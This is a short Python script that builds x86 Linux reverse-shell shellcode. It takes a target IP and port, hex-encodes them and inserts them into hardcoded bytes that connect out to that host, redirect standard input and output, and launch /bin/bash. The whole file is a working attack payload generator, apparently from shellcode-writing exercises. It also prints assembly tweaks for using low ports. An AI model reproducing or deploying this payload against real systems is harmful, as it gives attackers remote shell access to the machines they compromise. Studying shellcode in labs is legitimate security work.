#!/usr/bin/env python

import sys
import socket
import binascii

if len(sys.argv) < 3:
    print("[-] Provide a port (> 256) and IP address")
    sys.exit()
else:
    if int(sys.argv[1]) <= 256:
        print("[-] Port needs to be greater than 256 to guarantee sockaddr struct size is accurate and avoid null bytes.\n")
        print("If you require a lower port, consider changing the instructions in connect from:")
        print("\tpush 0x0101017f\n\tpush word 0x5C11\n\tpush word bx\n")
        print("to:")
        print("\txor ecx, ecx\n\tpush 0x0101017f\n\tsub esp, 2  ; stack alignment\n\tmov byte [esp], cl  ; null\n\tmov byte [esp], 0x65  ; port 100\n\tpush word 0x2\n")
        sys.exit()

    lport = int(sys.argv[1])
    ip = sys.argv[2]

def ip2Hex(ip):
	ipHex = ""
	for b in ip.split('.'):
		ipHex += "\\x%02x" % (int(b))
	return ipHex

def setPort(lport):
    p = hex(lport)[2:]
    psize = len(str(p))
    if psize == 1 or psize == 3:
        p = "0" + p

    psize = len(str(p))

    if psize == 2:
        fport = '\\x' + str(p)[0:2]
    else:
        fport = '\\x' + str(p)[0:2] + '\\x' + str(p)[2:4]

    if "\\x00" in fport:
        print("[!] Port conversion contains a null byte, I'm lazy, so choose another port maybe?")
        sys.exit()
    else:
        return fport

port = setPort(lport)
ipHex = ip2Hex(ip)

print("[+] Hex port: " + port)
print("[+] Hex ip: " + ipHex)

shellcode = ""
shellcode += "\\x31\\xc0\\x31\\xdb\\xb0\\x66\\x53\\x6a\\x01\\x6a"
shellcode += "\\x02\\x89\\xe1\\xfe\\xc3\\xcd\\x80\\x89\\xc7\\xb0"
shellcode += "\\x66\\x43\\x68"
shellcode += ipHex # IP
shellcode += "\\x66\\x68"
shellcode += port # PORT
shellcode += "\\x66\\x53\\x89\\xe6\\x6a\\x10\\x56\\x57\\x89"
shellcode += "\\xe1\\x43\\xcd\\x80\\x87\\xdf\\x31\\xc9\\xb1\\x02"
shellcode += "\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50"
shellcode += "\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f"
shellcode += "\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2"
shellcode += "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print("[+] Shellcode: \n" + shellcode)
